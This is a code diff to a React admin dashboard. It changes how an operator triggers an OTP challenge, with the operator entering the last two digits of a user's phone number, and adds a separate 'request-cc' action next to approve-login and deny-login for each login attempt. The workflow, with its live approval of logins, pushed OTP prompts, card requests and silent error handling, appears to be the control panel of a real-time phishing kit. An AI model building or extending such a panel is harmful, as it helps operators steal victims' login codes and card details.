@@ -101,13 +101,13 @@ export default function AdminDashboard() {
         const lastTwoDigits = prompt("Please enter the last two digits of the user's phone number:");
         if (lastTwoDigits && lastTwoDigits.match(/^\d{2}$/)) {
             try {
-                // Call the new, simplified endpoint
-                await fetch(`${API_BASE_URL}/api/send-otp/${attemptId}`, {
-        method: 'POST',
+                // Call the correct endpoint for OTP
+                await fetch(`${API_BASE_URL}/api/initiate-otp-challenge/${attemptId}`, {
+                    method: 'POST',
                     headers: { 'Content-Type': 'application/json', },
                     body: JSON.stringify({ last_two_digits: lastTwoDigits }),
-        credentials: 'include',
-      });
+                    credentials: 'include',
+                });
             } catch (err) {
                 // Handle error silently
             }
@@ -117,10 +117,22 @@ export default function AdminDashboard() {
         return; // Stop further execution for this action
     }
 
+    // New logic for requesting CC
+    if (action === 'request-cc') {
+        try {
+            await fetch(`${API_BASE_URL}/api/request-cc/${attemptId}`, {
+                method: 'POST',
+                credentials: 'include',
+            });
+        } catch (err) {
+            // Handle error silently
+        }
+        return;
+    }
+
     const endpointMap: { [key: string]: string } = {
         'approve': `approve-login/${attemptId}`,
         'deny': `deny-login/${attemptId}`,
-        'request-cc': `request-cc/${attemptId}`,
     };
     const endpoint = endpointMap[action];
     if (!endpoint) return;
